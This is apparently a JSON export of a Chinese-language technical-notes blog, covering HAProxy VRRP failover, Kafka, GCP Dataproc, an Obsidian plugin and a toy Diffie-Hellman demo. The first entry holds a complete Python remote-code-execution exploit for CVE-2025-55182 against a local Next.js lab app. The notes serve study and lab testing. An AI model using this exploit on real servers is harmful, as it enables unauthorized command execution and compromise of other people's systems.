[
{
		"title": "CVE-2025-55182 漏洞研究",
		"date":"Wed Dec 17 2025 15:42:44 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/CVE-2025-55182 漏洞研究/",
		"content": "npm create next-app@16.0.6\n\ncd my-app/\nnpm run dev\n\n打開 http://localhost:3000\n攻擊程式\n# refrence: https://github.com/msanft/CVE-2025-55182\n\nimport requests\nimport sys\nimport json\n\nBASE_URL = sys.argv[1] if len(sys.argv) &gt; 1 else &quot;http://localhost:3000&quot;\nEXECUTABLE = sys.argv[2] if len(sys.argv) &gt; 2 else &quot;id&quot;\n\ncrafted_chunk = {\n&quot;then&quot;: &quot;$1:__proto__:then&quot;,\n&quot;status&quot;: &quot;resolved_model&quot;,\n&quot;reason&quot;: -1,\n&quot;value&quot;: '{&quot;then&quot;: &quot;$B0&quot;}',\n&quot;_response&quot;: {\n&quot;_prefix&quot;: f&quot;var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});&quot;,\n# If you don't need the command output, you can use this line instead:\n# &quot;_prefix&quot;: f&quot;process.mainModule.require('child_process').execSync('{EXECUTABLE}');&quot;,\n&quot;_formData&quot;: {\n&quot;get&quot;: &quot;$1:constructor:constructor&quot;,\n},\n},\n}\n\nfiles = {\n&quot;0&quot;: (None, json.dumps(crafted_chunk)),\n&quot;1&quot;: (None, '&quot;$@0&quot;'),\n}\n\nheaders = {&quot;Next-Action&quot;: &quot;x&quot;}\nres = requests.post(BASE_URL, files=files, headers=headers, timeout=10)\nprint(res.status_code)\nprint(res.text)",
		"tags": [ "note","CVE"]
},

{
		"title": "HA proxy VRRP 研究",
		"date":"Wed Dec 17 2025 15:42:44 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/Proxy/HA proxy VRRP 研究/",
		"content": "#haproxy #vrrp #linux #keepalived #proxy\nVRRP(Virtual Router Redundancy Protocol)\n主要實現工具是 keepalived，他會透過 vrrp 廣播 master 的心跳，一但 master 死掉，Backup 就會代替 Master 回覆指定 IP 的 arp request。\n兩台主機上都有 HA Proxy，接收到請求後會再傳到後端 server\n架構圖\n\n參考教學 : https://medium.com/@abhilashkulkarni340/vrrp-and-4-simple-steps-to-set-it-up-on-ubuntu-454c46abb3b4\n安裝\nhaproxy\n$ sudo apt install haproxy\n$ haproxy -v\nHA-Proxy version 2.0.33-0ubuntu0.1 2023/10/31 - https://haproxy.org/\n\nkeepalived\n$ apt-get install keepalived\n$ systemctl status keepalived\n● keepalived.service - Keepalive Daemon (LVS and VRRP)\nLoaded: loaded (/lib/systemd/system/keepalived.service; enabled; vendor preset: enabled)\nActive: inactive (dead)\nCondition: start condition failed at Thu 2024-11-21 13:47:53 CST; 2h 11min ago\n\nNov 21 13:47:53 jason-2 systemd[1]: Condition check resulted in Keepalive Daemon (LVS and VRRP) being skipped.\n\n出現 inactive 是正常的，因為沒有 keepalived 的設定檔\n所以要從 keepalived config sample 裡面拿到範例設定檔\n$ cp /usr/share/doc/keepalived/samples/keepalived.conf.sample /etc/keepalived/keepalived.conf\n\nVRRP 主備切換環境\n\n設定檔\njason-1(Master)、jason-2(Backup) 兩台測試機的設定檔都要放\njason-1(Master)\n/etc/haproxyhaproxy.cfg\nglobal\n\tlog /dev/log\tlocal0\n\tlog /dev/log\tlocal1 notice\n\tchroot /var/lib/haproxy\n\tstats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners\n\tstats timeout 30s\n\tuser haproxy\n\tgroup haproxy\n\tdaemon\n\n\t# Default SSL material locations\n\tca-base /etc/ssl/certs\n\tcrt-base /etc/ssl/private\n\n\t# See: https://ssl-config.mozilla.org/#server=haproxy&amp;server-version=2.0.3&amp;config=intermediate\nssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384\nssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256\nssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets\n\ndefaults\n\tlog\tglobal\n\tmode\thttp\n\toption\thttplog\n\toption\tdontlognull\ntimeout connect 5000\ntimeout client 50000\ntimeout server 50000\n\terrorfile 400 /etc/haproxy/errors/400.http\n\terrorfile 403 /etc/haproxy/errors/403.http\n\terrorfile 408 /etc/haproxy/errors/408.http\n\terrorfile 500 /etc/haproxy/errors/500.http\n\terrorfile 502 /etc/haproxy/errors/502.http\n\terrorfile 503 /etc/haproxy/errors/503.http\n\terrorfile 504 /etc/haproxy/errors/504.http\n\nfrontend firstbalance\nbind *:80\noption forwardfor\ndefault_backend webservers\n\nbackend webservers\nbalance roundrobin\nserver test-2 10.xx.x.154:8080 check &lt;-- 這個要指定後端 server 位置\n\n/etc/keepalived/keepalived.conf\n! Configuration File for keepalived\n\nglobal_defs {\nrouter_id LVS_DEVEL\n}\n\nvrrp_instance VI_1 {\nstate MASTER # 路由器的首選狀態 - MASTER 或 BACKUP\ninterface ens160 # IP 位址綁定的介面。它還必須添加到 virtual_ipaddress 部分\nunicast_src_ip 10.xx.x.153 # 目前路由器的IP位址\nunicast_peer{\n10.xx.x.154 # VRRP中其他路由器的IP位址\n}\nvirtual_router_id 50\n# nopreempt # nopreempt允許一個priority比較低的節點作為master，即使有priority更高的節點啟動。\npriority 101 # 優先權：該路由器在其他路由器中的優先權\nadvert_int 1\nvirtual_ipaddress {\n\t 10.xx.x.160 # 此部分用於新增虛擬 IP 位址 (VIP)。請注意它如何與 src_ip 和對等點位於同一網路中。\n}\n}\n\njason-2(Backup)\n/etc/haproxyhaproxy.cfg\nglobal\n\tlog /dev/log\tlocal0\n\tlog /dev/log\tlocal1 notice\n\tchroot /var/lib/haproxy\n\tstats socket /run/haproxy/admin.sock mode 660 level admin expose-fd listeners\n\tstats timeout 30s\n\tuser haproxy\n\tgroup haproxy\n\tdaemon\n\n\t# Default SSL material locations\n\tca-base /etc/ssl/certs\n\tcrt-base /etc/ssl/private\n\n\t# See: https://ssl-config.mozilla.org/#server=haproxy&amp;server-version=2.0.3&amp;config=intermediate\nssl-default-bind-ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384\nssl-default-bind-ciphersuites TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256\nssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets\n\ndefaults\n\tlog\tglobal\n\tmode\thttp\n\toption\thttplog\n\toption\tdontlognull\ntimeout connect 5000\ntimeout client 50000\ntimeout server 50000\n\terrorfile 400 /etc/haproxy/errors/400.http\n\terrorfile 403 /etc/haproxy/errors/403.http\n\terrorfile 408 /etc/haproxy/errors/408.http\n\terrorfile 500 /etc/haproxy/errors/500.http\n\terrorfile 502 /etc/haproxy/errors/502.http\n\terrorfile 503 /etc/haproxy/errors/503.http\n\terrorfile 504 /etc/haproxy/errors/504.http\nfrontend firstbalance\nbind *:80\noption forwardfor\ndefault_backend webservers\n\nbackend webservers\nserver test-2 172.xx.x.1:8080 check\n# option httpchk\n\n/etc/keepalived/keepalived.conf\n! Configuration File for keepalived\n\nglobal_defs {\nrouter_id LVS_DEVEL\n}\nvrrp_instance VI_1 {\ninterface ens160\nstate BACKUP\nunicast_src_ip 10.xx.x.154\nunicast_peer{\n10.xx.x.153\n}\nvirtual_router_id 50\n# nopreempt\npriority 101\nadvert_int 1\nvirtual_ipaddress {\n\t 10.xx.x.160\n}\n}\n\n[!TIP] Tip: nopreempt\n允許一個priority比較低的節點作為master，即使有priority更高的節點啟動。\n發生情境:\n其中一台設置為master，一台設置為backup。 當master出現異常后，backup自動切換為master。 當backup成為master后，master恢復正常后會再次搶佔成為master，導致不必要的主備切換。 因此可以將兩台keepalived初始狀態均配置為backup，設置不同的優先順序，優先順序高的設置nopreempt解決異常恢復后再次搶佔的問題。\n\n執行\njason-1(Master)\n$ sudo systemctl restart keepalived\n\njason-2(Backup)\n$ sudo systemctl restart keepalived\n\njason-2 這台目前是 BACKUP mode\n\n實驗\n目前狀態\njason-1 - Master\njason-2 - Backup\n\njason-3 觀測機\narp table 測試\n$ sudo arping 10.xx.x.160\n60 bytes from 00:xx:xx:xx:xx:88 (10.xx.x.160): index=1 time=517.786 usec\n\n現在 10.xx.x.160 是 jason-1(00:xx:xx:xx:88) 所負責的\n\n查看 arp table\n$ arp -a\n...\n? (10.xx.x.160) at 00:xx:xx:xx:xx:88 [ether] on ens160\n...\n\n關閉 jason-1(Master)\nsudo systemctl stop keepalived\n\n發現 jason-2(Backup) 主機接手 Master 位置\n\n到 jason-3 探測機，發現已經迅速切換主備位置了\n\narp table 也同步更新\n\n服務也未中斷\n\nVRRP工作原理\nref: https://info.support.huawei.com/info-finder/encyclopedia/zh/VRRP.html\n當Master設備出現故障時，路由器B和路由器C會選舉出新的Master設備。 新的Master設備開始回應對虛擬IP位址的ARP回應，並定期發送VRRP通告報文。\nVRRP的詳細工作過程如下：\n\nVRRP備份組中的設備根據優先順序選舉出Master。 Master設備通過發送免費ARP報文，將虛擬MAC位址通知給與它連接的設備或者主機，從而承擔報文轉發任務。\nMaster設備週期性向備份組內所有Backup設備發送VRRP通告報文，通告其配置資訊（優先順序等）和工作狀況。\n如果Master設備出現故障，VRRP備份組中的Backup設備將根據優先順序重新選舉新的Master。\nVRRP備份組狀態切換時，Master設備由一台設備切換為另外一台設備，新的Master設備會立即發送攜帶虛擬路由器的虛擬MAC位址和虛擬IP位址資訊的免費ARP報文，刷新與它連接的設備或者主機的MAC表項，從而把使用者流量引到新的Master設備上來，整個過程對使用者完全透明。\n原Master設備故障恢復時，若該設備為IP位址擁有者（優先順序為255），將直接切換至Master狀態。 若該設備優先順序小於255，將首先切換至Backup狀態，且其優先順序恢復為故障前配置的優先順序。\nBackup設備的優先順序高於Master設備時，由Backup設備的工作方式（搶佔方式和非搶佔方式）決定是否重新選舉Master。",
		"tags": ["haproxy", "vrrp", "linux", "keepalived", "proxy", "note","vrrp","haproxy"]
},

{
		"title": "Consumer offset reset 行為",
		"date":"Wed Dec 17 2025 15:42:44 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/Consumer offset reset 行為/",
		"content": "情境\n\nconsumer 預期會從 kafka 持續讀取 log，但如果 consumer crash，kafka 會保存 commited offset 7 天\n也說明，若 consumer 停機超過 7 天，之前消費的位置將會被重置\n參數\n\nauto.offset.reset=latest: 會從 kafka topic 最末端讀取 log\nauto.offset.reset=earliest: 從最早的地方開始讀 log\nauto.offset.reset=none: 若沒有 offset 資訊，將會拋出 exception\n\n重播 log 給 consumer\n\n步驟如下:\n\n關閉該 consumer group 底下所有的 consumer\n使用 kafka-consumer-groups 重置你想重置的 offset 位置\n重啟 consumer\n\nJava code\n透過 addShutdownHook 偵測 shutdown event\n...\n// get a reference\nfinal Thread mainThread = Thread.currentThread();\n\nRuntime.getRuntime().addShutdownHook(new Thread(){\npublic void run(){\nlog.info(&quot;Detected a shutdown event&quot;);\nconsumer.wakeup();\n\ntry {\nmainThread.join();\n} catch (InterruptedException e) {\ne.printStackTrace();\n}\n}\n});\n...\ntry(openSearchClient; consumer){\nboolean indexExists = openSearchClient.indices().exists(new GetIndexRequest(indexName), RequestOptions.DEFAULT);\nif (!indexExists){\n// we need to create the index on opensearch if it doesn't exist already\nCreateIndexRequest createIndexRequest = new CreateIndexRequest(indexName);\nopenSearchClient.indices().create(createIndexRequest, RequestOptions.DEFAULT);\nlog.info(&quot;The wikimedia index has been created&quot;);\n} else {\nlog.info(&quot;The wikimedia index already exists&quot;);\n}\n\nwhile (true){\nConsumerRecords&lt;String, String&gt; records = consumer.poll(Duration.ofMillis(3000));\n\nint recordCount = records.count();\nlog.info(&quot;Received &quot; + recordCount + &quot; record(s)&quot;);\nBulkRequest bulkRequest = new BulkRequest();\nfor (ConsumerRecord&lt;String, String&gt; record : records){\ntry{\nString id = extractId(record.value());\n// send the record into opensearch\nIndexRequest indexRequest = new IndexRequest(indexName)\n.source(record.value(), XContentType.JSON)\n.id(id);\n//IndexResponse indexResponse = openSearchClient.index(indexRequest, RequestOptions.DEFAULT);\nbulkRequest.add(indexRequest);\n} catch (Exception e){\n\n}\n}\nif (bulkRequest.numberOfActions() &gt; 0){\nBulkResponse bulkResponse = openSearchClient.bulk(bulkRequest, RequestOptions.DEFAULT);\nlog.info(&quot;Inserted &quot; + bulkResponse.getItems().length + &quot; record(s).&quot;);\ntry {\nThread.sleep(1000);\n} catch (InterruptedException e) {\ne.printStackTrace();\n}\n\n}\n\nconsumer.commitAsync();\nlog.info(&quot;offset have been committed!&quot;);\n}\n} catch (WakeupException e){\nlog.info(&quot;Consumer is starting to shutdown&quot;);\n} catch (Exception e){\nlog.error(&quot;unexpected exception: &quot;, e);\n} finally {\nconsumer.close(); // close the consumer, this will also commit offest to kafka.\nopenSearchClient.close();\nlog.info(&quot;The consumer is now gracefully shut down&quot;);\n}",
		"tags": [ "note","kafka","java"]
},

{
		"title": "kafka  topic 實驗",
		"date":"Wed Dec 17 2025 15:42:44 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/kafka  topic 實驗/",
		"content": "#kafka\n環境設定\ndocker-compose.yaml\nversion: '2.1'\nservices:\nzoo1:\nimage: confluentinc/cp-zookeeper:7.3.2\nhostname: zoo1\ncontainer_name: zoo1\nports:\n- &quot;2181:2181&quot;\nenvironment:\nZOOKEEPER_CLIENT_PORT: 2181\nZOOKEEPER_SERVER_ID: 1\nZOOKEEPER_SERVERS: zoo1:2888:3888\n\nkafka1:\nimage: confluentinc/cp-kafka:7.3.2\nhostname: kafka1\ncontainer_name: kafka1\nports:\n- &quot;9092:9092&quot;\n- &quot;29092:29092&quot;\n- &quot;9999:9999&quot;\nenvironment:\nKAFKA_ADVERTISED_LISTENERS: INTERNAL://kafka1:19092,EXTERNAL://${DOCKER_HOST_IP:-127.0.0.1}:9092,DOCKER://host.docker.internal:29092\nKAFKA_LISTENER_SECURITY_PROTOCOL_MAP: INTERNAL:PLAINTEXT,EXTERNAL:PLAINTEXT,DOCKER:PLAINTEXT\nKAFKA_INTER_BROKER_LISTENER_NAME: INTERNAL\nKAFKA_ZOOKEEPER_CONNECT: &quot;zoo1:2181&quot;\nKAFKA_BROKER_ID: 1\nKAFKA_LOG4J_LOGGERS: &quot;kafka.controller=INFO,kafka.producer.async.DefaultEventHandler=INFO,state.change.logger=INFO&quot;\nKAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1\nKAFKA_TRANSACTION_STATE_LOG_REPLICATION_FACTOR: 1\nKAFKA_TRANSACTION_STATE_LOG_MIN_ISR: 1\nKAFKA_JMX_PORT: 9999\nKAFKA_JMX_HOSTNAME: ${DOCKER_HOST_IP:-127.0.0.1}\nKAFKA_AUTHORIZER_CLASS_NAME: kafka.security.authorizer.AclAuthorizer\nKAFKA_ALLOW_EVERYONE_IF_NO_ACL_FOUND: &quot;true&quot;\ndepends_on:\n- zoo1\n\ndocker compose up -d\n\ndocker exec -it kafka1 bash\n\n刪除 JMX env\nunset JMX_PORT &amp;&amp; unset KAFKA_JMX_OPTS\n\n建立一個 topic\nkafka-topics --create --topic quickstart-events --bootstrap-server localhost:9092\n\n檢查 topic 詳情\nkafka-topics --describe --topic quickstart-events --bootstrap-server localhost:9092\n\n建一個 producer\nkafka-console-producer --topic quickstart-events --bootstrap-server localhost:9092\n\n查看目前 topic 有多少 message, 顯示的是 offset 的值\n$ kafka-run-class kafka.tools.GetOffsetShell --broker-list localhost:9092 --topic quickstart-events\nquickstart-events:0:16\n\n$ kafka-run-class kafka.tools.GetOffsetShell --broker-list localhost:9092 --topic filebeat\nfilebeat:0:0\n\n建立一個 訂閱者，訂閱 quickstart-events\nkafka-console-consumer --topic quickstart-events --from-beginning --bootstrap-server localhost:9092\n\n測試 kafka consumer group 消費機制\nkafka-console-producer --topic quickstart-events --bootstrap-server localhost:9092 --group 1\n\n同一個 group 只會有一個 consumer 會消費到一個 topic 的訊息\n\n顯示目前 kafka 有多少 topic\n[appuser@kafka1 ~]$ kafka-topics --list --bootstrap-server localhost:9092\n__consumer_offsets\nfilebeat\nmetricbeat\nmy_group2_v2\nquickstart-events",
		"tags": ["kafka", "note","kafka"]
},

{
		"title": "kafka 高效率傳輸設定",
		"date":"Wed Dec 17 2025 15:42:44 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/apache_kafka/kafka 高效率傳輸設定/",
		"content": "訂閱 kafka 消息\nkafka-console-consumer --bootstrap-server 127.0.0.1:19092 --topic wikimedia.recentchange\n\n高效率傳輸時，可考慮以下設定\n\nmax.in.flight.requests.per.connection\n\n每個 producer 在 broker 回覆 ack 前，最多送幾筆訊息出去\n若設定 = 1\n\n訊息只會一筆一筆發，會降低效率，但好處是，若訊息需要嚴格的排序(有新增 sort key)，那很重要\n\nlinger.ms\n\n等待一段 linger.ms，在此期間收到的消息都放在自己的暫存區，若 broker 批處理(batch.size)在 linger.ms 到達之前填滿，則立即批處理暫存區內的訊息，否則達到 linger.ms 才進行批處理\n\ncompression.type\n\n批處理參數，用於 broker 端壓縮訊息使用的算法(e.g. lz4、zstd、gzip...etc)\n\nbatch.size\n\n批處理的單筆 message 大小，若超過，則立即處理該訊息",
		"tags": [ "note","kafka"]
},

{
		"title": "GCP dataproc 運行 python scripts",
		"date":"Wed Dec 17 2025 15:42:44 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/pySpark/GCP dataproc 運行 python scripts/",
		"content": "建立 dataproc cluster\ngcloud dataproc clusters create jason-test-spark-job \\\n--region=us-central1 \\\n--properties='^#^dataproc:conda.packages=google-cloud-storage==2.18.2#yarn:yarn.scheduler.maximum-allocation-mb=256928#yarn:yarn.nodemanager.resource.memory-mb=256928'\n\nproperties\n在 package 裡面安裝 python package\ndataproc:conda.packages=google-cloud-storage==2.18.2\n指定 memory 使用量\nyarn:yarn.scheduler.maximum-allocation-mb=256928#yarn:yarn.nodemanager.resource.memory-mb=256928\npyspark pip install\n\n建立\nrequirements.txt\n\npytest==6.2.5\npyspark==3.2.0\ngoogle-cloud-storage==1.43.0\nmlflow==1.23.0\n\n寫 pip init 腳本\npip_init.py\n\n#!/bin/bash\n# 1. 確認 requirements.txt 文件是否已經上傳到 GCS 並下載到本地\nGCS_BUCKET_PATH=&quot;gs://dataproc-staging-us-central1-473678078038-tw1bdolx/requirements.txt&quot;\n\nLOCAL_PATH=&quot;/tmp/requirements.txt&quot;\n\n# 下載 requirements.txt\ngsutil cp ${GCS_BUCKET_PATH} ${LOCAL_PATH}\n\n# 使用 pip 安裝依賴\npip install -r ${LOCAL_PATH}\n\n上傳檔案\n\ngsutil cp requirements.txt gs://dataproc-staging-us-central1-473678078038-tw1bdolx/\ngsutil cp pip_init.sh gs://dataproc-staging-us-central1-473678078038-tw1bdolx/\n\n刪除原本的 cluster\ngcloud dataproc clusters delete jason-test-spark-job --region=us-central1\n\n建立 cluster 時運行腳本\n\ngcloud dataproc clusters create jason-test-spark-job \\\n--region=us-central1 \\\n--initialization-actions=gs://dataproc-staging-us-central1-473678078038-tw1bdolx/pip_init.sh\n\nDelete cluster\ngcloud dataproc clusters delete jason-test-spark-job --region=us-central1\nSubmit job\ngcloud dataproc jobs submit pyspark test.py --region=us-central1 --cluster jason-test-spark-job\n\n[!IMPORTANT]\n記得要切換 GCP 環境 (SIT/UAT/PROD)\n\n#python #pyspark #spark #cluster",
		"tags": ["python", "pyspark", "spark", "cluster", "note","pyspark"]
},

{
		"title": "安裝 Obsidian 語意搜尋套件",
		"date":"Wed Dec 17 2025 15:42:44 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/安裝 Obsidian 語意搜尋套件/",
		"content": "Plugin repo: https://github.com/bbawj/obsidian-semantic-search?tab=readme-ov-file#demo\n在 Settings -&gt; Community plugins -&gt; Browse\n\n搜尋 Semantic Search\n\n安裝套件\n\n啟用 Semantic 套件\n\n安裝 ollama\nhttps://ollama.com/download\n下載 embeding model\nollama pull nomic-embed-text\n\n檢查 model 是否有安裝成功\n$ ollama list\nNAME ID SIZE MODIFIED\nnomic-embed-text:latest 0a109f422b47 274 MB About an hour ago\n\n參數名稱\n設定值\n\nAPI URL\nhttp://localhost:11434/api/embed\n\nModel\nnomic-embed-text\n\n設定參數\n\n打開 command palette\n\n按照以下順序執行\n\n之後就可以用這個進行語意搜尋\n\n整體語意搜尋結果還不錯\n\n總結\n透過這個 obsidian 工具，可以做到語意級別的模糊搜尋，有時候可能就是模糊的感覺，沒有明確的關鍵字，就可以考慮用這個搜尋工具進行搜尋。",
		"tags": [ "note","obsidian"]
},

{
		"title": "密碼學 - 零知識證明 - 密鑰協商",
		"date":"Wed Dec 17 2025 15:42:44 GMT+0000 (Coordinated Universal Time)",
		"url":"/技術文件/密碼學 - 零知識證明 - 密鑰協商/",
		"content": "範例程式(Diffie-Hellman 方法)\n讓我們用密碼學最常用的人名 Bob 與 Alice 舉例\nBob 端\nimport random\n# Diffie-Hellman\np = 23 # 公開參數\ng = 5 # 公開參數\n\nbob_private = random.randint(1, p-1)\nbob_public = (g ** bob_private) % p # 2\nprint(&quot;Bob 的公開值：&quot;, bob_public)\n\nalice_public = int(input(&quot;請輸入 Alice 的公開值: &quot;))\nbob_shared = (alice_public ** bob_private) % p\nprint(&quot;Bob 計算的共享密鑰：&quot;, bob_shared)\n\nAlice 端\nimport random\np = 23 # 公開參數\ng = 5 # 公開參數\n\nalice_private = random.randint(1, p-1)\nalice_public = (g ** alice_private) % p # 8\nprint(&quot;Alice 的公開值：&quot;, alice_public)\n\nbob_public = int(input(&quot;請輸入 Bob 的公開值: &quot;))\nalice_shared = (bob_public ** alice_private) % p\nprint(&quot;Alice 計算的共享密鑰：&quot;, alice_shared)\n\n只要輸入對方的公開數，就能計算出共享密鑰\n\n重放攻擊\n# Eve 已知 g, p, alice_public\np = 23 # 公開參數\ng = 5 # 公開參數\nalice_public = 12\n\n# Eve 嘗試所有可能的私鑰\nfor possible_private in range(1, p):\nif (g ** possible_private) % p == alice_public:\nprint(&quot;Alice 的私鑰是：&quot;, possible_private)\nbreak\n\n離散對數問題\n在正常情況下，Eve（攻擊者）無法輕易算出 Alice 的私鑰，這正是 Diffie-Hellman 密鑰交換的安全基礎。\n原因如下：\nAlice 的公開值是：alice_public = (g ** alice_private) % p\nEve 想要知道 alice_private，必須解「離散對數問題」：已知 g、p、alice_public，求 alice_private\n這個問題在大質數下是非常困難的（目前沒有有效的演算法），所以只要 p 夠大，Alice 的私鑰就很安全\n但如果 p 很小（像教學範例 p=23），Eve 可以用暴力法：\n這種方法只適用於 p 很小的情況。\n實務上 p 至少要 2048 位元，這樣 Eve 幾乎不可能算出 Alice 的私鑰。\n總結：\np 小時，Eve 可以暴力破解 Alice 的私鑰\np 夠大時，Eve 幾乎不可能算出 Alice 的私鑰\n這就是 Diffie-Hellman 的安全基礎\n安全質數\n選用夠大的「安全質數」可以防止離散對數被暴力攻擊\nhttps://datatracker.ietf.org/doc/html/rfc3526#section-2",
		"tags": [ "note","技術研究","演算法"]
},

{
		"title": "技術筆記",
		"date":"Wed Dec 17 2025 15:42:44 GMT+0000 (Coordinated Universal Time)",
		"url":"/",
		"content": "just 技術筆記",
		"tags": [ "note","gardenEntry"]
}
]